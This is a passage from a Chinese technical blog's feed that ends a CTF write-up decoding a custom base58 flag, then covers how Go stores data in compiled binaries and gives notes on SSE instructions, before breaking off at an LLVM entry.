返回值2: x mod y</p><p>z,x,y,m 的类型都是指向 Int 结构体的指针 *Int<br>Int 结构体定义如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Int <span class="hljs-keyword">struct</span> &#123;<br>neg <span class="hljs-keyword">bool</span> <span class="hljs-comment">// sign</span><br>abs nat  <span class="hljs-comment">// absolute value of the integer</span><br>&#125;<br><span class="hljs-keyword">type</span> nat []Word<br></code></pre></td></tr></table></figure><p>64位 golang 中 Word 代表的是一个64位整数， nat 就是整数的切片数组。</p><p>这些定义对寻找数据很有帮助!</p><p>循环代码类似:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">x = flag<br>table = <span class="hljs-string">&#x27;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> x &gt; <span class="hljs-number">0</span>:<br>result = result + table[x % <span class="hljs-number">58</span>]<br>x = x // <span class="hljs-number">58</span><br></code></pre></td></tr></table></figure><p>应该是 base58 编码换表，根据正向过程手写逆向过程如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;2GVdudkYo2CBXoQii7gfpkjTc4gT&#x27;</span><br>table = <span class="hljs-string">&#x27;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#x27;</span><br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:<br>    idx = table.find(i)<br>    c = c * <span class="hljs-number">58</span><br>    c = c + idx<br>print(c)<br><span class="hljs-built_in">hex</span>(c) ...再转 ASCII<br></code></pre></td></tr></table></figure><p>We1CT2345}Fc0m_flag 换顺序得到 flag{We1CTFc0m_2345}</p><h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>TODO…….</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] “<a href="https://golang.org/src/math/big/int.go&quot;">https://golang.org/src/math/big/int.go&quot;</a><br>[2] “<a href="https://golang.org/src/math/big/nat.go&quot;">https://golang.org/src/math/big/nat.go&quot;</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang underlying data representaion</title>
    <link href="/2021/04/14/Golang-underlying-data-representaion/"/>
    <url>/2021/04/14/Golang-underlying-data-representaion/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang-underlying-data-representaion"><a href="#Golang-underlying-data-representaion" class="headerlink" title="Golang underlying data representaion"></a>Golang underlying data representaion</h1><p>有些沙雕出题人就是喜欢用 go 来恶心人，做个总结</p><p>简单记录一下 Golang 各种数据类型的存储形式、参数传递、返回值传递等等</p><p>本文的数据均在 64位 环境下得出.</p><p>为了方便观察代码，关掉编译优化</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">-gcflags <span class="hljs-string">&quot;-N -l&quot;</span><br><br><span class="hljs-keyword">go</span> build -<span class="hljs-keyword">o</span> hw.<span class="hljs-keyword">exe</span> -gcflags <span class="hljs-string">&quot;-N -l&quot;</span> HelloWorld.<span class="hljs-keyword">go</span><br></code></pre></td></tr></table></figure><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>记住最重要的一点，无论是 x86 还是 x86-64， 都采用栈传递参数，类似 stdcall</p><p>返回值传递不通过 eax/rax 等寄存器，也是通过栈。位置是最后一个参数之上。例如最后一个参数的地址是 <code>rsp + 0x8</code>, 则:</p><ul><li>第一个返回值： rsp + 0x10</li><li>第二个返回值:   rsp + 0x18</li><li>。。。。。。</li></ul><p>返回值（一个或多个）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testfunc</span><span class="hljs-params">(a <span class="hljs-keyword">int</span>)</span> <span class="hljs-params">(i,j <span class="hljs-keyword">int</span>)</span></span>  &#123;<br>i = a + <span class="hljs-number">1</span><br>j = a + <span class="hljs-number">2</span><br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a, b <span class="hljs-keyword">int</span><br>a, b = testfunc(<span class="hljs-number">123</span>)<br>a = a + <span class="hljs-number">1</span><br>b = b + <span class="hljs-number">2</span><br>fmt.Println(a, b)<br>&#125;<br></code></pre></td></tr></table></figure><p>调用代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov     qword ptr [rsp], 123   ; 参数<br>call    main_testfunc<br>mov     rax, [rsp+8]          ; 返回值1<br>mov     rcx, [rsp+10h]        ; 返回值2<br></code></pre></td></tr></table></figure><h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>方法还有一个额外的参数，可以理解为 this</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">/* 定义结构体 */</span><br><span class="hljs-keyword">type</span> Circle <span class="hljs-keyword">struct</span> &#123;<br>radius <span class="hljs-keyword">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> c1 Circle<br>c1.radius = <span class="hljs-number">10.00</span><br>fmt.Println(<span class="hljs-string">&quot;area is: &quot;</span>, c1.getArea(<span class="hljs-number">10</span>))<br>&#125;<br><br><span class="hljs-comment">//该 method 属于 Circle 类型对象中的方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c Circle)</span> <span class="hljs-title">getArea</span><span class="hljs-params">(cnt <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">float64</span></span> &#123;<br><span class="hljs-comment">//c.radius 即为 Circle 类型对象中的属性</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">3.14</span> * c.radius * c.radius * <span class="hljs-keyword">float64</span>(cnt)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">movsd   qword ptr [rsp], xmm0  ;  Circle struct <br>mov     qword ptr [rsp+8], 0Ah ; 10<br>call    main_Circle_getArea<br>movsd   xmm0, qword ptr [rsp+10h] ; 获取返回值<br></code></pre></td></tr></table></figure><p>可以看出 this 相当于第一个参数。</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stringTest = <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>内存格式</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">String</span>&#123;</span><br><span class="hljs-keyword">char</span> * strPtr;<br>int64 <span class="hljs-built_in">size</span>;<br>&#125;<br><br>debug060:<span class="hljs-number">000000</span>C0000D9F40 dq offset aFlagListenobje               ; <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span><br>debug060:<span class="hljs-number">000000</span>C0000D9F48 dq <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h2 id="Slice-切片"><a href="#Slice-切片" class="headerlink" title="Slice 切片"></a>Slice 切片</h2><h3 id="make"><a href="#make" class="headerlink" title="make"></a>make</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">slice1 := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>, <span class="hljs-built_in">len</span>)<br></code></pre></td></tr></table></figure><p>make 函数是一个 builtin 函数，貌似由编译器处理？ </p><p>slice 结构</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">struct</span> slice &#123;<br><span class="hljs-attribute">dq</span>    dataPtr;<br><span class="hljs-attribute">dq</span>  len;<br><span class="hljs-attribute">dq</span>  cap;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2021/04/14/Golang-underlying-data-representaion/image-20210414151420839.png" class="" title="image-20210414151420839"><p>slice 结构构造代码由编译器生成，相当于内联 inline make 函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">go:<br>slice1 :&#x3D; make([]int, len)<br><br>asm:<br>call    runtime_makeslice<br>mov     [rsp+28h], rdx &#x2F;&#x2F; rdx &#x3D; makeslice 创建的数组基地址<br>mov     [rsp+30h], rax &#x2F;&#x2F; rax &#x3D; len<br>mov     [rsp+38h], rcx &#x2F;&#x2F; rcx &#x3D; cap<br></code></pre></td></tr></table></figure><p>make 最底层调用 runtime_makeslice 分配 Array</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// runtime_makeslice</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeslice</span><span class="hljs-params">(et *_type, <span class="hljs-built_in">len</span>, <span class="hljs-built_in">cap</span> <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">unsafe</span>.<span class="hljs-title">Pointer</span></span> &#123;<br>mem, overflow := math.MulUintptr(et.size, <span class="hljs-keyword">uintptr</span>(<span class="hljs-built_in">cap</span>))<br><span class="hljs-keyword">if</span> overflow || mem &gt; maxAlloc || <span class="hljs-built_in">len</span> &lt; <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span> &gt; <span class="hljs-built_in">cap</span> &#123;<br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> Produce a &#x27;len out of range&#x27; error instead of a</span><br><span class="hljs-comment">// &#x27;cap out of range&#x27; error when someone does make([]T, bignumber).</span><br><span class="hljs-comment">// &#x27;cap out of range&#x27; is true too, but since the cap is only being</span><br><span class="hljs-comment">// supplied implicitly, saying len is clearer.</span><br><span class="hljs-comment">// See golang.org/issue/4085.</span><br>mem, overflow := math.MulUintptr(et.size, <span class="hljs-keyword">uintptr</span>(<span class="hljs-built_in">len</span>))<br><span class="hljs-keyword">if</span> overflow || mem &gt; maxAlloc || <span class="hljs-built_in">len</span> &lt; <span class="hljs-number">0</span> &#123;<br>panicmakeslicelen()<br>&#125;<br>panicmakeslicecap()<br>&#125;<br><br><span class="hljs-keyword">return</span> mallocgc(mem, et, <span class="hljs-literal">true</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>makeslice 返回的是一个指向实际数据的指针（不含管理slice的结构体）相当于  <code>malloc(sizeof(Type) * len)</code></p><p>在访问slice中元素时，一般会检测下标是否小于len, 如果越界则调用<code>runtime_panicIndex</code></p><h3 id="append-copy"><a href="#append-copy" class="headerlink" title="append / copy"></a>append / copy</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">slice1 = <span class="hljs-built_in">append</span>(slice1, <span class="hljs-number">123</span>)<br></code></pre></td></tr></table></figure><p>append 的时候会检测目标 slice1.len + 1 与 slice1.cap 的大小关系</p><p>若 slice1.len + 1 &gt; slice1.cap 则调用 runtime_growslice 扩容</p><p>copy 就是复制一个新的切片</p><h3 id="切片截取"><a href="#切片截取" class="headerlink" title="切片截取"></a>切片截取</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">myvar := slice1[<span class="hljs-number">1</span>:<span class="hljs-number">20</span>]<br></code></pre></td></tr></table></figure><p>myvar 的数据结构是新一个新的切片 struct.<br>myvar.dataPtr = &amp;slice1.dataPtr[1]<br>myvar.len = 20 - 1<br>myvar.cap = slice1.cap - 1<br>dataPtr 相当于传的一个引用</p><h2 id="range"><a href="#range" class="headerlink" title="range"></a>range</h2><p>略，不会调用新函数，逻辑比较简单，佷容易理解</p><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>runtime_mapassign_*</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapassign</span><span class="hljs-params">(t *maptype, h *hmap, key unsafe.Pointer)</span> <span class="hljs-title">unsafe</span>.<span class="hljs-title">Pointer</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>3个参数，第三个参数是key的指针，rsp + 0x8 * 2， 返回值是 key 对应的数据指针.</p><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapaccess1</span><span class="hljs-params">(t *maptype, h *hmap, key unsafe.Pointer)</span> <span class="hljs-title">unsafe</span>.<span class="hljs-title">Pointer</span></span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>和赋值同理，区别是这个不会为不存在的 key 创建 key pair.</p><h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>        <span class="hljs-string">&quot;fmt&quot;</span><br>        <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">say</span><span class="hljs-params">(s <span class="hljs-keyword">string</span>)</span></span> &#123;<br>        <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++ &#123;<br>                time.Sleep(<span class="hljs-number">100</span> * time.Millisecond)<br>                fmt.Println(s)<br>        &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">go</span> say(<span class="hljs-string">&quot;world&quot;</span>)<br>        say(<span class="hljs-string">&quot;hello&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">call    runtime_newproc<br><br>rsp&#x3D;&gt;000000C00010FF58<br><br>debug062:000000C00010FF58 dq 10h    ; rsp here<br>debug062:000000C00010FF60 dq offset off_515DD0      ;pointer to main_say<br>debug062:000000C00010FF68 dq offset aWorld                        ; &quot;world&quot;  这里开始就是参数了<br>debug062:000000C00010FF70 dq 5<br></code></pre></td></tr></table></figure><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>convXXX 类似 assert 的功能，逆向时忽略即可</li></ul><p>目前就这么多，以后遇到再补吧。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.runoob.com/go/go-slice.html">https://www.runoob.com/go/go-slice.html</a> “Go 语言切片(Slice)”</p><p>[2] <a href="https://golang.org/src/runtime/slice.go">https://golang.org/src/runtime/slice.go</a> “<a href="https://golang.org/src">src</a>/<a href="https://golang.org/src/runtime">runtime</a>/slice.go”</p>]]></content>
    
    
    <categories>
      
      <category>PL_Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSE Instructions</title>
    <link href="/2021/04/12/SSE-Instructions/"/>
    <url>/2021/04/12/SSE-Instructions/</url>
    
    <content type="html"><![CDATA[<h1 id="SSE-Instructions"><a href="#SSE-Instructions" class="headerlink" title="SSE Instructions"></a>SSE Instructions</h1><p>记录一些 SSE 指令集最基础的东西，经常容易忘。</p><p>一些比较混的概念 SSE、MMX、XMM、SIMD</p><p>SIMD:  Single instruction, multiple data 就是一条指令处理一组数据，描述指令集性质的一个缩写。</p><p>SSE 是 SIMD 指令集，支持同时处理多组数据（整数/浮点），属于 SIMD 指令集。 SSE 进一步升级还有SSE2,SSE3……</p><p>MMX 也是 SIMD 指令集，只不过是以前 IA32 的 SIMD 解决方案，缺点是占用 FPU 寄存器，浮点和 SIMD 不能同时处理，SSE 引入了 XMM 寄存器解决了这个问题。</p><p>SIMD 指令集主要用于多媒体操作吧，比如信号/图像处理，这些处理涉及到大量的矩阵运算。简单说，矩阵基本运算用 for 循环实现真的太拉垮。一般线性代数库就会用平台 SIMD 指令集优化计算算法，这也是为什么 ml 里面的各种公式最好要向量化实现。</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>SSE 最基本的寄存器: XMM0 - XMM7： 128 bit registers</p><p>AMD64 (x86-64) / IA64: XMM8 - XMM15</p><h2 id="SSE-指令"><a href="#SSE-指令" class="headerlink" title="SSE 指令"></a>SSE 指令</h2><p>指令速查网站:<a href="https://software.intel.com/sites/landingpage/IntrinsicsGuide/">https://software.intel.com/sites/landingpage/IntrinsicsGuide/</a></p><p>本文记录的指令有SSE，SSE2，SSE3</p><p>SSE 指令运算有两种类型 <code>packed</code>和<code>scalar</code></p><p>packed 多组数据一起运算</p><p>scalar 只有一组数据运算(标量运算)（低64/32位）</p><h3 id="Floating-point-instructions"><a href="#Floating-point-instructions" class="headerlink" title="Floating-point instructions"></a>Floating-point instructions</h3><p>内存 Load / Store</p><ul><li>Scalar – <code>MOVSS</code></li><li>Packed – <code>MOVAPS, MOVUPS, MOVLPS, MOVHPS, MOVLHPS, MOVHLPS, MOVMSKPS</code></li><li>MOVAPS，MOVUPS <ul><li>区别：前者要求内存地址 16 字节对齐，后者不需要对齐。</li><li>共同：Load 完整 128 bit</li></ul></li><li><code>movhps</code> - to/from the higher part of <code>xmm</code> register.</li><li><code>movlps</code> - to/from the lower part of <code>xmm</code>.</li><li><code>movhlps</code> - from higher part of source register to lower part of destination register.</li><li><code>movlhps</code> - from lower part of source register to higher part of destination register.</li></ul><p>运算</p><ul><li>Scalar – <code>ADDSS, SUBSS, MULSS, DIVSS, RCPSS, SQRTSS, MAXSS, MINSS, RSQRTSS</code></li><li>Packed – <code>ADDPS, SUBPS, MULPS, DIVPS, RCPPS, SQRTPS, MAXPS, MINPS, RSQRTPS</code></li></ul><p>比较</p><ul><li>Scalar – <code>CMPSS, COMISS, UCOMISS</code></li><li>Packed – <code>CMPPS</code></li></ul><p>数据改组(shuffle/unpacking)</p><ul><li>Packed – <code>SHUFPS, UNPCKHPS, UNPCKLPS</code></li></ul><p>shuffle 机翻译出来就是改组，我也不知道翻译对不对。shuffle 将 XMM 寄存器中元素的顺序改变或者混和两个寄存器的值。</p><p>shufps 指令有 3 个操作数（2个XMM寄存器，8bit的掩码)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">shufps xmm, xmm, imm8<br></code></pre></td></tr></table></figure><p>目的寄存器的前两个元素(低64bit)可以被覆盖成目的寄存器的任意两个元素。</p><p>目的寄存器的第三四元素(高32bit)可以被源寄存器任意两个元素。</p><p>imm8 掩码作用是控制元素的选择，掩码分成 4 组长度为2bit的数据 00 | 00 | 00 | 00，分别控制元素来源的选择。</p><p>00 - src[31:0]</p><p>01 - src[63:32]</p><p>10 - src[95:64]</p><p>11 - src[127:96]</p><p>src 可以是目的寄存器和源寄存器, 取决于目的寄存器中重组的位置。</p><p>intel 给的伪代码很清晰</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs inform7">DEFINE SELECT4(src, control) &#123;<br>CASE(control<span class="hljs-comment">[1:0]</span>) <span class="hljs-keyword">OF</span><br>0:tmp<span class="hljs-comment">[31:0]</span> := src<span class="hljs-comment">[31:0]</span><br>1:tmp<span class="hljs-comment">[31:0]</span> := src<span class="hljs-comment">[63:32]</span><br>2:tmp<span class="hljs-comment">[31:0]</span> := src<span class="hljs-comment">[95:64]</span><br>3:tmp<span class="hljs-comment">[31:0]</span> := src<span class="hljs-comment">[127:96]</span><br>ESAC<br>RETURN tmp<span class="hljs-comment">[31:0]</span><br>&#125;<br>dst<span class="hljs-comment">[31:0]</span> := SELECT4(a<span class="hljs-comment">[127:0]</span>, imm8<span class="hljs-comment">[1:0]</span>)<br>dst<span class="hljs-comment">[63:32]</span> := SELECT4(a<span class="hljs-comment">[127:0]</span>, imm8<span class="hljs-comment">[3:2]</span>)<br>dst<span class="hljs-comment">[95:64]</span> := SELECT4(b<span class="hljs-comment">[127:0]</span>, imm8<span class="hljs-comment">[5:4]</span>)<br>dst<span class="hljs-comment">[127:96]</span> := SELECT4(b<span class="hljs-comment">[127:0]</span>, imm8<span class="hljs-comment">[7:6]</span>)<br></code></pre></td></tr></table></figure><p>数据类型转换</p><p>整数转浮点，浮点转整数</p><ul><li>Scalar – <code>CVTSI2SS, CVTSS2SI, CVTTSS2SI</code>, <code>cvtsi2sd</code>,<code>cvtsd2si</code>,<code>cvttsd2si</code></li><li>Packed – <code>CVTPI2PS, CVTPS2PI, CVTTPS2PI</code></li></ul><ul><li>Integer to float/doubles<ul><li>cvtsi2ss, cvtsi2sd</li></ul></li><li>floats/doubles to integers<ul><li><code>cvtss2si</code> convert 32-bit float to integer, round up/down</li><li><code>cvttss2si</code> convert 32-bit float to integer, truncate result</li><li><code>cvtsd2si</code>  convert 64-bit double to integer, round</li><li><code>cvttsd2si</code> convert 64-bit double to integer, truncate</li></ul></li></ul><ul><li><p>Convert between floats and doubles</p><ul><li><code>cvtss2sd</code> convert 32-bit float to 64-bit double</li><li><code>cvtsd2ss</code> convert 64-bit float to 32-bit float</li></ul></li></ul><p>先说一下命名，例如 <code>CVTSI2SS</code></p><p>CVT + SI + 2 + SS：</p><ul><li>SI: Scalar Integer</li><li>SS: Scalar Single Folat point</li><li>整数转单精度浮点</li></ul><p><code>CVTSS2SI</code> CVT + SS + 2 + SI 即单精度浮点转整数</p><p><code>CVTTSS2SI</code> CVTT + SS + 2 + SI 也是单精度浮点转整数 （Truncation）</p><p>总结一下:</p><ul><li>SS:  标量，单精度浮点</li><li>SI:  标量，整数</li><li>SD: 标量，双精度浮点</li><li>PS: 向量，单精度浮点</li><li>PI：向量，整数</li><li>PD: 向量，双精度</li><li>US: unisgned 无符号</li></ul><p><code>cvt</code> 与 <code>cvtt</code> 有什么区别呢？</p><p> <code>cvt</code> 转换浮点时就近舍去浮点（四舍五入），<code>cvtt</code> 直接舍掉小数点后的数字保留整数部分（c/c++ 默认）</p><p><code>CVTPI2PS</code> CVT + PI + 2 + PS:</p><ul><li>PI： Packed Integer</li><li>PS：  packed Single Float</li></ul><p>逻辑运算</p><ul><li>Packed – <code>ANDPS, ORPS, XORPS, ANDNPS</code></li></ul><p><code>ANDPS</code>: AND + Packed + Single</p><h3 id="Integer-instructions"><a href="#Integer-instructions" class="headerlink" title="Integer instructions"></a>Integer instructions</h3><p>Arithmetic</p><ul><li><code>PADDB</code>, <code>PADDW</code>, <code>PADDD</code>,<code>PADDQ</code>, <code>PADDSB</code>，<code>PADDSB</code></li><li><code>PMULHUW, PSADBW, PAVGB, PAVGW, PMAXUB, PMINUB, PMAXSW, PMINSW</code></li></ul><p><code>PADDSB</code> ：Add packed signed byte integers with saturation</p><p>saturation 是运算比较特殊运行，可以运算将结果限制在某个区间内。</p><p>Data movement</p><ul><li><code>PEXTRW, PINSRW</code></li></ul><p>Other</p><ul><li><code>PMOVMSKB, PSHUFW</code></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions">https://en.wikipedia.org/wiki/Streaming_SIMD_Extensions</a> “Streaming SIMD Extensions”</p><p>[2] <a href="https://blog.csdn.net/arau_sh/article/details/6161871">https://blog.csdn.net/arau_sh/article/details/6161871</a> “MMX 和SSE指令集的区别是什么”</p><p>[3] <a href="https://stackoverflow.com/questions/16218665/simd-and-difference-between-packed-and-scalar-double-precision">https://stackoverflow.com/questions/16218665/simd-and-difference-between-packed-and-scalar-double-precision</a> “SIMD and difference between packed and scalar double precision”</p><p>[4] <a href="https://students.mimuw.edu.pl/~zbyszek/asm/en/instrukcje-sse.html">https://students.mimuw.edu.pl/~zbyszek/asm/en/instrukcje-sse.html</a> “SSE Instructions (Streaming SIMD Extensions)”</p><p>[5] <a href="https://software.intel.com/sites/landingpage/IntrinsicsGuide/#text=_mm_shuffle_ps&amp;expand=5197">https://software.intel.com/sites/landingpage/IntrinsicsGuide/#text=_mm_shuffle_ps&amp;expand=5197</a> “Intrinsics Guide”</p><p>[6] <a href="https://blog.csdn.net/zp288105109a/article/details/100008264">https://blog.csdn.net/zp288105109a/article/details/100008264</a> “[汇编]汇编学习笔记（4）：SHUFPS（洗牌）指令”</p><p>[6] <a href="https://www.cs.uaf.edu/2012/fall/cs301/lecture/10_26_asm_float.html">https://www.cs.uaf.edu/2012/fall/cs301/lecture/10_26_asm_float.html</a> “CS301: Floating Point in x86 Assembly”</p><p>[7] <a href="https://montcs.bloomu.edu/Presentations/Old/240/16.floating-point-SSE.pdf">https://montcs.bloomu.edu/Presentations/Old/240/16.floating-point-SSE.pdf</a> “Introduction to Scalar FloatingPoint Operations via SSE”</p><p>[8] <a href="https://en.wikipedia.org/wiki/X86_instruction_listings#SSE2_instructions">https://en.wikipedia.org/wiki/X86_instruction_listings#SSE2_instructions</a> “x86 instruction listings” </p>]]></content>
    
    
    <categories>
      
      <category>Asm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>x86</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LLVM Liveness Analysis</title>
    <link href="/2021/04/06/LLVM-Liveness-Analysis/"/>
    <url>/2021/04/06/LLVM-Liveness-Analysis/</url>
    
